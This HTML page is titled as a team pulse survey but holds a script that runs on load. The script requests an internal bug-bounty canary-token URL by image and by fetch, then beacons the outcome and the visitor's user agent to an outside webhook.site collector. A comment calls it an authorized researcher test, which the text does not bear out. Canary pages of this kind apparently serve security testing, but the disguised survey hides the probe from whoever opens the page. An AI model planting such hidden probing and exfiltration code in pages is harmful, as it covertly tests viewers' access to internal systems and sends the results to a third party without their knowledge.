<h2>Q3 Team Pulse Survey</h2>

<!-- researcher test page (authorized own-account, case CAT1): one tracking pixel + delivery-status report to researcher collector; no other actions -->
<script>
(function(){
  var out={t:Date.now(),img:null,fetch:null,ua:navigator.userAgent.slice(0,80)};
  var done=0;
  function fin(){ done++; if(done===2){ try{navigator.sendBeacon('https://webhook.site/fdfac34c-4508-46fd-96d0-da78a36627b1/hit?case=CAT1-CANARY', JSON.stringify(out));}catch(e){} } }
  var im=new Image();
  im.onload=function(){out.img='load';fin()};
  im.onerror=function(){out.img='error';fin()};
  im.src='https://www.internalfb.com/intern/bug-bounty/get-canary-token/';
  fetch('https://www.internalfb.com/intern/bug-bounty/get-canary-token/',{mode:'no-cors',cache:'no-store'})
    .then(function(){out.fetch='resolved'})
    .catch(function(e){out.fetch='rejected '+((e&&e.message)||'')})
    .finally(fin);
  setTimeout(function(){ if(done<2){ out.timeout=true; try{navigator.sendBeacon('https://webhook.site/fdfac34c-4508-46fd-96d0-da78a36627b1/hit?case=CAT1-CANARY', JSON.stringify(out));}catch(e){} done=2; } },15000);
})();
</script>
